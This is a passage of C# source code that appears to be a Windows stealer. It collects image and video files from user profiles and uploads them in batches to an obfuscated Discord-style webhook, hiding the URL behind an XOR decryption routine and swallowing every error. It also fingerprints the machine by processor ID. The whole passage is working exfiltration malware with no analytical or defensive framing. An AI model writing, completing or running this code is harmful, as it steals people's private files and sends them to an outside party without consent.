                await client.PostAsync(WebhookUrl, form);
            }
            catch { }
        }

        static async Task SendOrganizedBatch(
            List<string> filePaths, string profileLabel, string category, int batchNum)
        {
            try
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(60);
                using var form = new MultipartFormDataContent();

                var lines = new List<string>();
                int added = 0;

                for (int i = 0; i < filePaths.Count; i++)
                {
                    string fp = filePaths[i];
                    byte[] bytes;
                    try { bytes = File.ReadAllBytes(fp); }
                    catch { continue; }

                    var fileContent = new ByteArrayContent(bytes);
                    fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                    form.Add(fileContent, $"file{i + 1}", Path.GetFileName(fp));

                    string displayPath = fp.Length > 60 ? "..." + fp[^57..] : fp;
                    lines.Add($"`{displayPath}` — `{bytes.Length / 1024} KB`");
                    added++;
                }

                if (added == 0) return;

                string emoji = category == "Images" ? "🖼️" : "🎬";
                string header =
                    $"**{emoji} {category}** | Profile `{profileLabel}` | Batch `#{batchNum}`\n" +
                    string.Join("\n", lines);

                if (header.Length > 1900) header = header[..1900] + "...";

                string escaped = header
                    .Replace("\\", "\\\\")
                    .Replace("\"", "\\\"")
                    .Replace("\n", "\\n");

                form.Add(
                    new StringContent($"{{\"content\":\"{escaped}\"}}", Encoding.UTF8, "application/json"),
                    "payload_json");

                await client.PostAsync(WebhookUrl, form);
            }
            catch { }
        }

        // ─── HWID + WEBHOOK DECRYPT ──────────────────────────────────────────

        static string GetHWID()
        {
            try
            {
                using var mc = new ManagementClass("win32_processor");
                using var moc = mc.GetInstances();
                foreach (ManagementObject mo in moc)
                    return mo.Properties["processorID"]?.Value?.ToString() ?? "Unknown";
            }
            catch { }
            return "Unknown";
        }

        static string DecryptHook(byte[] data)
        {
            byte[] buf = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                buf[i] = (byte)(data[i] ^ _xorKey[i % _xorKey.Length] ^ (byte)(i * 7));
            return Encoding.UTF8.GetString(buf);
        }
    }
}